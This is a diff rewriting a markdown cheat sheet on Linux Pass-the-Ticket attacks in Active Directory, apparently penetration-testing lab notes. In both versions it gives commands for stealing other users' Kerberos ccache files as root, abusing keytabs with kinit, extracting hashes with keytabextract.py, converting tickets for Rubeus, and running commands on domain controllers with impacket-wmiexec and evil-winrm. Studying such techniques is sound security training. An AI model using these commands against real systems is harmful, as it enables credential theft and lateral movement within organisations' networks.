@@ -1,431 +1,229 @@
+# 🛰️ Linux Pass the Ticket (PtT) Cheat Sheet
 
-
-> [!info] Overview  
-> Linux systems can connect to Active Directory using **Kerberos** for centralized authentication.
+> [!info] 🧠 What is Linux PtT?
 > 
-> If compromised, Kerberos tickets can be abused to impersonate users and move laterally across the domain.
-
----
-
-## Kerberos Storage on Linux
-
-> [!abstract] Common Storage Types
-
-### **1. ccache files**
-
-Temporary Kerberos credential cache.
-
-**Default location**
-
-```bash
-/tmp/krb5cc_*
-```
-
-**Environment variable**
-
-```bash
-echo $KRB5CCNAME
-```
-
-Purpose:
-
-- Stores active Kerberos tickets
-    
-- Used during authenticated sessions
-    
-
-If stolen:
-
-- Immediate user impersonation possible
-    
-
----
-
-### **2. Keytab files**
-
-Files containing:
-
-- Kerberos principals
-    
-- Encrypted keys derived from passwords
-    
-
-Common locations:
-
-```bash
-/etc/krb5.keytab
-*.keytab
-```
-
-Purpose:
-
-- Automated Kerberos authentication
-    
-- Used in scripts/services
-    
-
-If stolen:
-
-- Request new tickets
-    
-- Extract hashes
-    
-- Crack passwords
-    
-- Impersonate users
-    
-
----
-
-## Identifying AD Integration
-
-> [!check] Check if Linux is domain-joined
-
-### Using `realm`
-
-```bash
-realm list
-```
-
-Look for:
-
-- `configured: kerberos-member`
-    
-- Domain name
-    
-- Allowed users/groups
-    
-
----
-
-### Using process checks
-
-```bash
-ps -ef | grep -i "winbind\|sssd"
-```
-
-Indicators:
-
-- `sssd`
-    
-- `winbind`
-    
-
----
-
-## Finding Kerberos Tickets
-
-> [!todo] Enumeration targets
-
-### Find keytab files
-
-```bash
-find / -name "*keytab*" -ls 2>/dev/null
-```
-
-Important:
-
-- Read/write access required
-    
-
----
-
-### Check cronjobs/scripts
-
-Look for:
-
-```bash
-kinit
-.keytab
--k -t
-```
-
-Example:
-
-```bash
-crontab -l
-cat script.sh
-```
-
-This often reveals:
-
-- Service account names
-    
-- Keytab paths
-    
-
----
-
-### Find ccache files
-
-Check active cache:
-
-```bash
-env | grep KRB5
-```
-
-Search `/tmp`
-
-```bash
-ls -la /tmp
-```
-
----
-
-## Abusing Keytab Files
-
-> [!success] User impersonation
-
-### View keytab details
-
-```bash
-klist -k -t file.keytab
-```
-
-Shows:
-
-- Principal
-    
-- Timestamp
-    
-- Ticket owner
-    
-
----
-
-### Import keytab into session
-
-```bash
-kinit user@DOMAIN -k -t file.keytab
-```
-
-Verify:
-
-```bash
-klist
-```
-
----
-
-### Access resources as impersonated user
-
-```bash
-smbclient //target/share -k -c ls
-```
-
----
-
-## Extracting Hashes from Keytabs
-
-> [!warning] Credential extraction
-
-Use:
-
-```bash
-python3 keytabextract.py file.keytab
-```
-
-Extracts:
-
-- NTLM hash
-    
-- AES128 hash
-    
-- AES256 hash
-    
-
-Uses:
-
-- Pass-the-Hash
-    
-- Crack password
-    
-- Forge Kerberos tickets
-    
-
----
-
-### Crack extracted NTLM
-
-Tools:
-
-- Hashcat
-    
-- John
-    
-- Crackstation
-    
-
----
-
-## ccache Abuse
-
-> [!danger] Requires file read access
-
-### Import stolen ccache
-
-```bash
-export KRB5CCNAME=/path/to/ccache
-```
-
-Verify:
-
-```bash
-klist
-```
-
----
-
-### Use stolen identity
-
-```bash
-smbclient //dc01/C$ -k -c ls
-```
-
----
-
-## Root-Level Ticket Abuse
-
-> [!danger] Root can impersonate all users
-
-As root:
-
-```bash
-ls -la /tmp
-```
-
-Copy target cache:
-
-```bash
-cp /tmp/krb5cc_xxxx .
-```
-
-Load it:
-
-```bash
-export KRB5CCNAME=/root/krb5cc_xxxx
-```
-
-Check:
-
-```bash
-klist
-```
-
----
-
-## Attack Flow
-
-> [!example] Typical escalation path
-
-```text
-Compromise Linux host
-    ↓
-Find keytab / ccache
-    ↓
-Extract / import
-    ↓
-Impersonate user
-    ↓
-Access AD resources
-    ↓
-Escalate to privileged account
-    ↓
-Pivot to Domain Controller
-```
-
----
-
-## Using Kerberos with Linux Attack Tools
-
-> [!info] Kerberos-aware tools
-
-### Impacket
-
-```bash
-impacket-wmiexec dc01 -k -no-pass
-```
-
----
-
-### Evil-WinRM
-
-```bash
-evil-winrm -i dc01 -r domain.htb
-```
-
----
-
-### SMB
-
-```bash
-smbclient //dc01/share -k
-```
-
----
-
-## Ticket Conversion
-
-> [!note] Convert Linux ↔ Windows tickets
-
-### ccache → kirbi
-
-```bash
-impacket-ticketConverter ticket.ccache ticket.kirbi
-```
-
----
-
-### Import into Windows
-
-```cmd
-Rubeus.exe ptt /ticket:ticket.kirbi
-```
-
----
-
-## Important Notes
-
-> [!warning]
-
-### Ticket expiration matters
-
-Always verify:
-
-```bash
-klist
-```
-
-Check:
-
-- Valid starting
-    
-- Expires
-    
-
-Expired tickets = unusable
-
----
-
-### KRB5CCNAME formatting
-
-Sometimes Linux uses:
-
-```bash
-FILE:/tmp/krb5cc_xxx
-```
-
-Some tools require:
-
-```bash
-/tmp/krb5cc_xxx
-```
-
-Remove `FILE:` if needed.
-
----
-
-## Key Takeaway
-
-> [!tldr]  
-> Pass the Ticket from Linux = stealing **ccache or keytab files** and reusing them to authenticate as domain users without knowing their passwords.
+> Bash
+> 
+> ```
+> Lateral movement technique to hijack Active Directory tokens on Linux hosts
+> ```
+> 
+> 💡 Allows administrators to:
+> 
+> - Impersonate valid AD domain users from a Linux machine
+>     
+> - Authenticate to remote network resources (SMB shares, DCs)
+>     
+> - Navigate domain environments **without knowing plaintext passwords**
+>     
+> 
+> ✔ Common in:
+> 
+> - Domain-joined corporate Linux endpoints, file servers, and web hosts
+>     
+
+> [!tip] 🔧 Core Idea
+> 
+> Bash
+> 
+> ```
+> Kerberos Ticket Extraction ↔ Session Injection
+> ```
+> 
+> 💡 Key Concepts:
+> 
+> - **Active Directory on Linux** uses standard Kerberos infrastructure for identity management
+>     
+> - **Windows vs Linux:** Windows stores tickets in the isolated `LSASS` process memory; Linux stores tickets directly in the filesystem layout
+>     
+> 
+> ✔ Think of it as **stealing a pre-authorized access token straight off the disk**
+
+# 🌳 Structure: Storage Mechanisms
+
+> [!info] 📚 ccache (Credential Cache)
+> 
+> Bash
+> 
+> ```
+> Temporary filesystem structures holding active Kerberos session tokens
+> ```
+> 
+> 💡 Function:
+> 
+> - Volatile cache generated when a domain user logs into the local Linux system
+>     
+> - Written by default to the **`/tmp`** directory with permissions matching the user's UID
+>     
+> - Tracked globally via the active **`$KRB5CCNAME`** environment variable
+>     
+
+> [!tip] 📍 Keytab (Key Table)
+> 
+> Bash
+> 
+> ```
+> Local file binaries storing pairs of Kerberos principals and encrypted keys
+> ```
+> 
+> 💡 Logic:
+> 
+> - Derived directly from the account password; allows automated background logins
+>     
+> - Used primarily by system administrators to authenticate cronjobs and automation scripts
+>     
+> - Non-restricted file structure that can be transferred and abused on any external host
+>     
+
+# 🔐 Storage Implementations
+
+|**Storage Type**|**Primary Location**|**Access Requirement**|**Post-Exploitation Value**|
+|---|---|---|---|
+|**User Session (`ccache`)**|`/tmp/krb5cc_*`|Owner UID / **Root**|Hijack the active user's network permissions immediately|
+|**System Identity (`keytab`)**|`/etc/krb5.keytab`|**Root Only**|Impersonate the Linux machine account account (`MACHINE$`)|
+|**Custom Automation (`keytab`)**|Home dirs / Script paths|Readable Permissions|Recover password hashes or request automated user TGTs|
+
+# 🔍 Footprinting & Enumeration
+
+> [!check] 📡 Active Directory Discovery
+> 
+> Bash
+> 
+> ```
+> # Verify Active Directory domain membership status
+> realm list
+> 
+> # Check for running integration daemons if realm is unavailable
+> ps -ef | grep -i "sssd\|winbind"
+> ```
+> 
+> 💡 Reveals domain configurations and permitted logon groups.
+
+> [!check] 🔍 Hunting for Session Assets
+> 
+> Bash
+> 
+> ```
+> # Map out active user session caches in the temporary directory
+> ls -la /tmp/krb5cc_*
+> 
+> # Check environment variables for the active session cache pointer
+> env | grep -i krb5
+> ```
+> 
+> 💡 Identifies target user sessions currently open on the machine.
+
+> [!check] 📂 Searching for Automation Keys
+> 
+> Bash
+> 
+> ```
+> # Locate exposed keytab configurations across the storage layout
+> find / -name "*keytab*" -ls 2>/dev/null
+> ```
+> 
+> 💡 Finds files holding long-term encrypted keys used by background scripts.
+
+# ⚠️ Common Exploitation Workflows
+
+> [!danger] 🔓 Session Hijacking via ccache (Requires Root)
+> 
+> Bash
+> 
+> ```
+> # 1. Duplicate target ticket cache to a controlled location
+> cp /tmp/krb5cc_647401106_target /root/hijacked_ccache
+> 
+> # 2. Force the current session context to target the stolen cache asset
+> export KRB5CCNAME=/root/hijacked_ccache
+> 
+> # 3. Validate the session identity is successfully loaded
+> klist
+> ```
+> 
+> 💡 Impact: Grants immediate network authorization as the targeted domain entity.
+
+> [!warning] ⚙️ Impersonation via Keytab (Low Privilege)
+> 
+> Bash
+> 
+> ```
+> # 1. Check principal mappings inside the target keytab file
+> klist -k -t /opt/specialfiles/carlos.keytab
+> 
+> # 2. Ingest keytab keys to request a live domain TGT session
+> kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+> ```
+> 
+> 💡 Risk: Establishes domain access without password interaction or modification requirements.
+
+# 🛠️ Post-Exploitation & Pivot Playbook
+
+> [!success] 📡 Interacting with Network Shares
+> 
+> Bash
+> 
+> ```
+> # Access remote Windows filesystems natively using the loaded ticket context
+> smbclient //dc01/C$ -k -no-pass -c 'ls'
+> ```
+
+> [!success] 📡 Cross-Platform Interoperability
+> 
+> Bash
+> 
+> ```
+> # Convert a stolen Linux ccache file into a Windows-compatible .kirbi file
+> impacket-ticketConverter /root/hijacked_ccache ticket.kirbi
+> ```
+
+> [!success] 📡 Remote Command Execution
+> 
+> Bash
+> 
+> ```
+> # Target remote systems from your attack host with Impacket over Kerberos
+> proxychains impacket-wmiexec dc01 -k -no-pass
+> 
+> # Establish interactive WinRM command execution sessions via Kerberos
+> proxychains evil-winrm -i dc01 -r inlanefreight.htb
+> ```
+
+> [!success] 📡 Offline Credential Recovery
+> 
+> Bash
+> 
+> ```
+> # Extract raw NTLM/AES hashes out of a keytab file for offline cracking
+> python3 keytabextract.py /opt/specialfiles/carlos.keytab
+> ```
+
+# ⚡ Real-World Attack Flow
+
+> [!success] 🧠 Attack Flow
+> 
+> Bash
+> 
+> ```
+> 1. Compromise domain-joined Linux node and check membership via 'realm list'
+> 2. Locate exposed custom scripts or check '/tmp' for active session ccache arrays
+> 3. Elevate to root to copy target ccache or run 'keytabextract.py' on keytabs
+> 4. Set local '$KRB5CCNAME' context to match the targeted token path
+> 5. Launch 'proxychains impacket-wmiexec -k' to execute commands on Windows DCs
+> ```
+> 
+> 💡 Cross-platform pivoting can be performed by transforming files via `impacket-ticketConverter`.
+
+# 🧩 Mental Model
+
+> [!quote] 🎯 Protocol Hierarchy
+> 
+> Bash
+> 
+> ```
+> ccache → The Live Boarding Pass
+> Keytab → The Passport Photo & Signature
+> $KRB5CCNAME → The Passenger Gate Line
+> ```
+> 
+> 💡 You use the "Passport" (Keytab) to generate a "Boarding Pass" (ccache), then show it to the "Gate" ($KRB5CCNAME) to board network resources.
